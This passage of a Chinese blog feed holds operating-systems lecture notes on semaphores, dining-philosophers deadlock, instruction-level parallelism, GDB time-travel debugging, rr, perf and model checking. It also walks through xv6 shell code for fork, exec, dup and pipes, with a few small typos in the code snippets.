class="number">2</span>);</span><br><span class="line">  SEM_INIT(&amp;fill, <span class="number">0</span>);</span><br><span class="line">  SEM_INIT(&amp;empty, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    create(producer);</span><br><span class="line">    create(consumer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通常来说，信号量在”一单位资源“明确的情况下比较好用 (比如这里的“一单位资源”就是指一个尚未匹配的左括号)，在有些场景下使用信号量很难写出正确的并发程序。此外，信号量的 V() 函数是可以在“没有领取手环”的时候“凭空”“变出一个手环“上交的，因此使用时必须格外小心。</p>
<h2 id="Dining-Philosophers-Problem"><a href="#Dining-Philosophers-Problem" class="headerlink" title="Dining Philosophers Problem"></a>Dining Philosophers Problem</h2><blockquote>
<p>五个哲学家围成一桌吃饭。每两个人之间有一把叉子 (一共五把)，哲学家只有同时拿到左边和右边的叉子才能吃饭。如何维护这件事情？</p>
</blockquote>
<p>这件事情不是很好明确“一单位资源“：一把叉子既是某位哲学家的“右叉子”，又是某位哲学家的“左叉子”，如果我们对每把叉子维护一个信号量，写入如下程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// philosopher.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread-sync.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="keyword">sem_t</span> locks[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tphilosopher</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> lhs = (N + id - <span class="number">1</span>) % N;</span><br><span class="line">  <span class="keyword">int</span> rhs = id % N;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    P(&amp;locks[lhs]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;T%d Got %d\n&quot;</span>, id, lhs + <span class="number">1</span>);</span><br><span class="line">    P(&amp;locks[rhs]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;T%d Got %d\n&quot;</span>, id, rhs + <span class="number">1</span>);</span><br><span class="line">    V(&amp;locks[lhs]);</span><br><span class="line">    V(&amp;locks[rhs]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">      SEM_INIT(&amp;locks[i], <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    create(Tphilosopher);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行一小会儿就会卡住。此时每个哲学家都抓着自己左手边的叉子，它们都想得到右叉子，但都得不到。因为都得不到，他们也不会放下自己手中的叉子。这就是死锁。如果把每把叉子想象成图中的节点，哲学家们对叉子的需求序列 (先要左叉子，再要右叉子) 就构成了一个环。如果锁依赖关系中有环，就可能出现死锁。</p>
<p>当然我们可以用万能的条件变量来正确实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mutex_lock(&amp;mutex);</span><br><span class="line"><span class="keyword">while</span> (!(avail[lhs] &amp;&amp; avail[rhs])) &#123;</span><br><span class="line">  wait(&amp;cv, &amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line">avail[lhs] = avail[rhs] = <span class="literal">false</span>;</span><br><span class="line">mutex_unlock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;mutex);</span><br><span class="line">avail[lhs] = avail[rhs] = <span class="literal">true</span>;</span><br><span class="line">broadcast(&amp;cv);</span><br><span class="line">mutex_unlock(&amp;mutex);</span><br></pre></td></tr></table></figure>

<p>该段代码与之前相比的区别在于，哲学家总是看到左右叉子都有再同时拿起，吃完了就会放下。不会出现之前方法中的哲学家拿到一把叉子再等另一把叉子，自己手里的叉子也不给别人用的情况。</p>
<p>系统中另一种常见的处理生产者-消费者模型的方法是 master-slave：我们安排一个服务员来维护所有的叉子，所有的哲学家都通过与服务员通信的方法来向服务员索要叉子/让服务员把叉子取走。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tphilosopher</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">  send_request(id, EAT);</span><br><span class="line">  P(allowed[id]); <span class="comment">// waiter 会把叉子递给哲学家</span></span><br><span class="line">  philosopher_eat();</span><br><span class="line">  send_request(id, DONE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twaiter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    (id, status) = receive_request();</span><br><span class="line">    <span class="keyword">if</span> (status == EAT) &#123; ... &#125;</span><br><span class="line">    <span class="keyword">if</span> (status == DONE) &#123; ... &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 10: Application of State Machine</title>
    <url>/2022/03/20/NJU-OS%20Lecture%2010%20-%20Application%20of%20State%20Machine/</url>
    <content><![CDATA[<h2 id="Compilers-and-Modern-CPU"><a href="#Compilers-and-Modern-CPU" class="headerlink" title="Compilers and Modern CPU"></a>Compilers and Modern CPU</h2><p>编译器的作用是将源代码状态机 $S$ 转换为二进制代码状态机 $C$：$C=Compile(S)$。只要两者的可观测行为严格一致，编译器可以随意修改指令执行的顺序，甚至修改指令内容。</p>
<span id="more"></span>

<p>现代 CPU 本质上也是“编译器”：只要保证硬件状态机的可观测行为一致，它可以乱序执行，可以多发射，还可以将没有依赖关系的指令“并行”地执行，这就是指令级并行 (instruction level parallelism, ilp)。我们可以用一个例子感受超标量处理器 (CPI&lt;1，平均每条指令所需的时钟周期小于 1) 的威力：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOOP 1000000000ul</span></span><br><span class="line"></span><br><span class="line">__attribute__((noinline)) <span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; LOOP; i++) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;mov $1, %%rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;mov $1, %%rdi;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;mov $1, %%rsi;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;mov $1, %%rdx;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;mov $1, %%rcx;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;mov $1, %%r10;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;mov $1, %%r8;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="string">&quot;mov $1, %%r9;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    :::<span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rdi&quot;</span>, <span class="string">&quot;rsi&quot;</span>, <span class="string">&quot;rdx&quot;</span>, <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r10&quot;</span>, <span class="string">&quot;r8&quot;</span>, <span class="string">&quot;r9&quot;</span>)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">clock_t</span> st = clock();</span><br><span class="line">  loop();</span><br><span class="line">  <span class="keyword">clock_t</span> ed = clock();</span><br><span class="line">  <span class="keyword">double</span> inst = LOOP * (<span class="number">8</span> + <span class="number">2</span>) / <span class="number">1000000000</span>;</span><br><span class="line">  <span class="keyword">double</span> ips = inst / ((ed - st) * <span class="number">1.0</span> / CLOCKS_PER_SEC);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%.2lfG instructions/s\n&quot;</span>, ips);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码的逻辑是在 loop() 中执行 8 条互相没有依赖的指令。即使使用最激进的优化，一次循环至少还有更新循环变量和跳转两条指令，因此一次循环至少 10 条指令。通过计算执行时间和指令条数来估算每秒钟可以执行的指令数。</p>
<blockquote>
<p><strong>Maybe a bug in GCC?</strong></p>
<p>如下代码理论上也可以达到相同的效果。它将变量 i 绑定到寄存器 %rbx 上，从而确保和下面 8 条指令互不冲突。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">register</span> <span class="keyword">volatile</span> <span class="keyword">long</span> i <span class="title">asm</span><span class="params">(<span class="string">&quot;rbx&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; LOOP; i++) &#123;</span><br><span class="line"> <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov $1, %rax;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov $1, %rdi;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov $1, %rsi;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov $1, %rdx;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov $1, %rcx;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov $1, %r10;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov $1, %r8;&quot;</span>fang shi |</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;mov $1, %r9;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但事实上，编译完成后使用反汇编查看，可以看到 $i$ 被绑定到了 %rax 上。</p>
</blockquote>
<p>笔者使用的计算机 CPU 型号如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Intel® Core™ i7-10710U CPU @ 1.10GHz × 12</span><br></pre></td></tr></table></figure>

<p>但运行该程序可以得到每秒钟能执行约 17G 条指令，CPI 远小于 1。这就是指令级并行的威力。</p>
<h2 id="Tracer"><a href="#Tracer" class="headerlink" title="Tracer"></a>Tracer</h2><p>我们总是希望可以在状态机执行的过程中观测状态机的行为，比如了解所有 system call 的执行时长，在某个状态停下来查看寄存器，PC 的值等等，于是我们有了 strace/gdb 等工具。</p>
<blockquote>
<p><strong>Shell 命令：strace</strong></p>
<p>在 strace 后加上 <code>-T</code> 选项即可看到执行某个程序过程中所有系统调用的耗时。</p>
</blockquote>
<p>我们平时使用 GDB 通常是 step/next/stepi/watchpoint，但基于状态机思想， GDB 可以实现更多炫酷的功能。比如我们可以给某个状态打快照，下次可以直接从快照状态开始执行。再比如我们可以实现反向执行。</p>
<h3 id="Time-Travel-Debugging"><a href="#Time-Travel-Debugging" class="headerlink" title="Time-Travel Debugging"></a>Time-Travel Debugging</h3><p>让 GDB 实现回退的功能，最直观的想法是保存每个时刻的快照。但运行时刻太多，快照要保存的内容也太多，这样做代价太大。</p>
<p>事实上，一条指令对状态机的影响很有限：它可能只能改变很少的几个寄存器的值或者几个内存地址的值。因此我们可以记录一个初始的状态机，和每条指令执行前后状态机的 diff。这样代价就小得多。想要实现回退，我们只要将增量撤销即可。</p>
<p>GDB 的回退和重放功能对一些 non-deterministic 的程序的调试极其有力。比如如下的程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rdrand.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> <span class="keyword">volatile</span> val = <span class="number">48</span>;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;rdrand %0&quot;</span>: <span class="string">&quot;=r&quot;</span>(val))</span></span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;rdrand returns %016lx\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rdrand 指令会生成一个随机数，从而使程序每次运行的结果无法预测。打开 GDB 后，使用 <code>record full</code> 命令打开记录，这样就可以在适当的时刻使用 <code>rsi</code> / <code>rs</code> 命令倒退执行，且一旦执行过一次 rdrand 之后，多次倒退回去再执行，变量 val 随机到的值都不会改变。</p>
<p>注：GDB 的反向执行不是万能的。对于一些比较复杂的指令 (例如一些系统调用)，记录状态机增量比较困难，GDB 没有实现这部分功能。</p>
<h3 id="Record-amp-Replay"><a href="#Record-amp-Replay" class="headerlink" title="Record &amp; Replay"></a>Record &amp; Replay</h3><p>如果我们想要重现一个程序执行的行为，我们只需要记录 non-deterministic 的指令执行完成后的状态机状态—— deterministic 的指令是无需记录的：假设 $s_0$ 执行 10000 条确定指令后到达 $s_1$，那么我们只需要记下 $s_0$ 和 10000 即可重放这段执行。</p>
<p>对于一个单线程的程序，我们需要记录的非确定事件包括系统调用，rdrand 等非确定指令等。Mozilla 的 rr 工具可以帮助我们记录并重放一个程序的执行过程。这对我们调试一些非确定程序的段错误极其有帮助。</p>
<blockquote>
<p><strong>Mozilla 的 rr 工具</strong></p>
<p>使用命令 <code>rr record ./exec</code> 即可记录运行程序 exec 的整个过程。使用 <code>rr replay</code> 命令即可重放整个过程。rr 会打开一个 GDB，我们可以自由地打断点并调试之前记录的执行过程。</p>
<p>rr 工具要求 perf_event_paranoid 的值小于等于 1，可以使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl kernel.perf_event_paranoid=1</span><br></pre></td></tr></table></figure>

<p>修改当前地 perf_event_paranoid 的值。</p>
</blockquote>
<p>对于一个单处理器的操作系统，我们需要记录的非确定事件包括 I/O 操作，中断等等。有了这些记录我们便可以重放操作系统启动和运行的全过程。</p>
<h2 id="Profiling"><a href="#Profiling" class="headerlink" title="Profiling"></a>Profiling</h2><p>想要做好性能优化，我们需要知道时间花在了哪里，什么对象占用了空间……这要求我们对状态机的执行进行真实监测。但我们的监测不能太频繁，不能干扰到程序的正常工作。一个好的思路是每隔一段事件暂停程序，观察并记录状态机的信息，这样便可以得到统计意义的性能摘要。</p>
<p>Linux perf 工具可以为我们提供一个程序运行的性能报告。以之前的 <code>ilp-demo.c</code> 为例，输入命令 <code>perf stat ./ilp-demo</code>，我们可以得到如下的精简报告，其中包括了上下文切换，缺页异常分支预测等多种信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Performance counter stats for &#x27;./ilp-demo&#x27;:</span><br><span class="line"></span><br><span class="line">              0.56 msec task-clock                #    0.449 CPUs utilized          </span><br><span class="line">                 0      context-switches          #    0.000 K/sec                  </span><br><span class="line">                 0      cpu-migrations            #    0.000 K/sec                  </span><br><span class="line">                55      page-faults               #    0.098 M/sec                  </span><br><span class="line">           975,780      cycles                    #    1.731 GHz                    </span><br><span class="line">           751,657      instructions              #    0.77  insn per cycle         </span><br><span class="line">           146,602      branches                  #  260.113 M/sec                  </span><br><span class="line">             5,119      branch-misses             #    3.49% of all branches        </span><br><span class="line"></span><br><span class="line">       0.001255936 seconds time elapsed</span><br><span class="line"></span><br><span class="line">       0.001289000 seconds user</span><br><span class="line">       0.000000000 seconds sys</span><br></pre></td></tr></table></figure>

<p>我们还可以使用 <code>perf recode ./exec</code> 和 <code>perf report</code> 查看详细的报告。</p>
<p>实际工程中的大部分情况满足“二八定律”：80%的时间消耗在非常集中的几处代码。因此用好 profiling 工具，有的放矢进行优化才是科学的方式。</p>
<h2 id="Model-Checker"><a href="#Model-Checker" class="headerlink" title="Model Checker"></a>Model Checker</h2><p>我们之前使用 model checker 检查并发 bug。事实上 model checker 可以检查更多我们想要的东西。比如如下程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">u32 x = rdrand();</span><br><span class="line">u32 y = rdrand();</span><br><span class="line"><span class="keyword">if</span> (x &gt; y)</span><br><span class="line">  <span class="keyword">if</span> (x * x + y * y == <span class="number">65</span>)</span><br><span class="line">    bug();</span><br></pre></td></tr></table></figure>

<p>我们想知道理论上 bug 是否可能会被触发。一个朴素的想法是对每种 x 和 y 的可能取值建立状态，但这样状态会太多，无法检查。更高效的 model checker 会将相似状态“合并”，或者引入符号计算——上述例子中，对于 rdrand()，我们可以给 x，y 赋值 uint32，if 语句的约束条件也一并写入状态机，最后调用约束求解器 (SMT Solver) 即可检查 bug 是否会被触发。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>Xv6-book Chapter 01: Operating System Interfaces</title>
    <url>/2022/01/20/Xv6-book%20Chapter%2001%20-%20Operating%20System%20Interfaces/</url>
    <content><![CDATA[<h2 id="1-1-Processes-and-memory"><a href="#1-1-Processes-and-memory" class="headerlink" title="1.1 Processes and memory"></a>1.1 Processes and memory</h2><p><code>fork()</code> 系统调用可以创建一个和当前进程存储内容完全相同的子进程（原进程称为父进程）。<code>fork()</code> 在父进程和子进程中都会返回，在父进程中返回创建的子进程的进程号，在子进程中返回 0。如果返回 -1 说明发生错误。</p>
<span id="more"></span>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;parent: child=%d\n&quot;</span>, pid);</span><br><span class="line">    pid = wait((<span class="keyword">int</span> *)<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;child %d is done\n&quot;</span>, pid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;child: existing\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>fork()</code> 系统调用使用后，父进程和子进程会同时运行（不过两个进程中的 pid 变量的值不同）。</p>
<ul>
<li>父进程进入 if 的第一个分支，打印信息后使用 <code>wait()</code> 系统调用。<code>wait(int *status)</code> 系统调用会返回退出的/被杀死的子进程的进程号，并将该子进程的状态写到 status 中。如果当前进程没有子进程 <code>wait()</code> 直接返回 -1；如果当前进程的子进程都没有退出/被杀死，<code>wait()</code> 会等待直到这件事发生。</li>
<li>子进程进入 if 的第二个分支，打印信息后使用 <code>exit(int status)</code> 系统调用返回。status 为 0 说明正常退出，status 为 1 说明非正常退出。</li>
</ul>
<p>该程序的输出结果为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">parent: child=<span class="number">1234</span></span><br><span class="line">child: existing			<span class="comment">// 这两行的先后顺序不确定，取决于哪个进程的 printf 先被执行</span></span><br><span class="line">child <span class="number">1234</span> is done		<span class="comment">// 子进程结束后，父进程会输出这句话</span></span><br></pre></td></tr></table></figure>

<hr>
<p>Xv6 的 shell 使用 <code>exec()</code> 系统调用来加载程序。如果成功加载，<code>exec()</code> 调用不会返回。<code>sh.c</code> 的关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (getcmd(buf, <span class="keyword">sizeof</span>(buf)) &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fork1() == <span class="number">0</span>)			<span class="comment">// fork1()是对fork()系统调用的进一步封装，检查了返回值</span></span><br><span class="line">        runcmd(parsecmd(buf));</span><br><span class="line">   	wait(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一旦有新的输入内容到来，shell 进程会 fork 出一个子进程，在子进程中运行程序，父进程 wait 直到子进程运行完成。<code>parsecmd()</code> 负责解析输入内容并打包成一个 cmd 结构体，<code>runcmd()</code> 负责运行一个 cmd 结构体，正常情况下不会返回：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">runcmd</span><span class="params">(struct cmd *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">switch</span>(cmd-&gt;type)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">default</span>: panic(<span class="string">&quot;runcmd&quot;</span>);	<span class="comment">// panic()会向标准错误流输出信息，并exit(1)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EXEC:</span><br><span class="line">            ecmd = (struct execcmd*)cmd;</span><br><span class="line">            <span class="keyword">if</span> (ecmd-&gt;argv[<span class="number">0</span>] == <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            exec(ecmd-&gt;argv[<span class="number">0</span>], ecmd-&gt;argv);</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;exec %s faile\n&quot;</span>, ecmd-&gt;argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通常来说 argv[0] 默认为文件名。如果 <code>exec()</code> 系统调用返回了，说明发生了错误，于是向标准错误流输出错误信息。(注：<code>exec()</code> 系统调用不会创建新进程，只会清空当前进程的 memory。)</p>
<h2 id="1-2-I-O-and-File-descriptors"><a href="#1-2-I-O-and-File-descriptors" class="headerlink" title="1.2 I/O and File descriptors"></a>1.2 I/O and File descriptors</h2><p>内核为每个进程都记录了一张表格，表格维护了每一个文件描述符对应的文件名。默认情况下，应用程序从 0 号文件读入（标准输入），1 号文件输出（标准输出），并将错误信息输出到 2 号文件（标准错误）。使用 <code>open()</code> 系统调用打开文件时，内核总是会把当前进程中的第一个未被分配的文件描述符索引到这个文件上。</p>
<p>将 <code>fork()</code> 和 <code>open()</code> 系统调用配合使用可以实现输入和输出的重定向，以 <code>cat &lt; input.txt</code> 为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    open(<span class="string">&quot;input.txt&quot;</span>, O_RDONLY); 、</span><br><span class="line">        <span class="comment">// 第二个参数描述文件的权限，有O_RDONLY,O_WRONLY,O_RDWR,O_CREATE,O_TRUNC等</span></span><br><span class="line">    exec(<span class="string">&quot;cat&quot;</span>, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <code>fork()</code> 创建子进程时子进程复制了父进程的所有文件描述符，在子进程中关闭控制台输入，并将 0 号文件重新绑定到 input.txt 上，从而完成了输入重定向。子进程中进行的这些操作是不会影响父进程的。</p>
<p>虽然 <code>fork()</code> 克隆的子进程是复制了一遍父进程的文件描述符，但子进程和父进程的文件共享文件偏移。比如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello &quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;World\n&quot;</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将会输出 “Hello World\n”，这是父进程和子进程共享 1 号文件的偏移的结果。</p>
<p>使用 <code>dup()</code> 系统调用可以复制一个文件描述符，它会返回一个新的文件描述符，新的文件描述符和被复制的指向同一个文件，且共享文件偏移。比如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = dup(<span class="number">1</span>);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Hello &quot;</span>, <span class="number">6</span>);</span><br><span class="line">write(fd, <span class="string">&quot;World\n&quot;</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure>

<p>将会输出 “Hello World\n”。**<code>fork()</code> 和 <code>dup()</code> 是唯二可以使得两个文件描述符共享文件偏移的系统调用。**我们平时在命令行中使用的 <code>2&gt;&amp;1</code>，其原理就是 <code>dup()</code> 系统调用。它的功能类似于</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">close(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> fd = dup(<span class="number">1</span>);	<span class="comment">// 这时2号是第一个未被分配的文件描述符</span></span><br></pre></td></tr></table></figure>

<h2 id="1-3-Pipes"><a href="#1-3-Pipes" class="headerlink" title="1.3 Pipes"></a>1.3 Pipes</h2><p><code>pipe()</code> 的声明为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe</span><span class="params">(<span class="keyword">int</span> pipefd[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>pipe()</code> 创建一个管道，在传进去的数组中填写两个文件描述符，pipefd[0] 是管道的输入端，pipefd[1] 是管道的输出端。<code>pipe()</code> 的返回值用于检验管道创建是否成功。</p>
<p>下面是 xv6 的 <code>sh.c</code> 中使用管道的方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">runcmd</span><span class="params">(struct cmd* cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span>(cmd-&gt;type)</span><br><span class="line">    &#123;</span><br><span class="line">    	...</span><br><span class="line">        <span class="keyword">case</span> PIPE:</span><br><span class="line">            <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    		pcmd = (struct pipecmd*)cmd;</span><br><span class="line">            <span class="keyword">if</span> (pipe(p) &lt; <span class="number">0</span>) panic(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (fork1() == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                close(<span class="number">1</span>);</span><br><span class="line">                dup(p[<span class="number">1</span>]);</span><br><span class="line">                close(p[<span class="number">0</span>]);</span><br><span class="line">                close&#123;p[<span class="number">1</span>]);</span><br><span class="line">                runcmd(pcmd-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (fork1() == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                close(<span class="number">0</span>);</span><br><span class="line">                dup(p[<span class="number">0</span>]);</span><br><span class="line">                close(p[<span class="number">0</span>]);</span><br><span class="line">                close(p[<span class="number">1</span>]);</span><br><span class="line">                runcmd(pcmd-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            close(p[<span class="number">0</span>]);</span><br><span class="line">            close(p[<span class="number">1</span>]);</span><br><span class="line">            wait(<span class="number">0</span>);</span><br><span class="line">            wait(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span 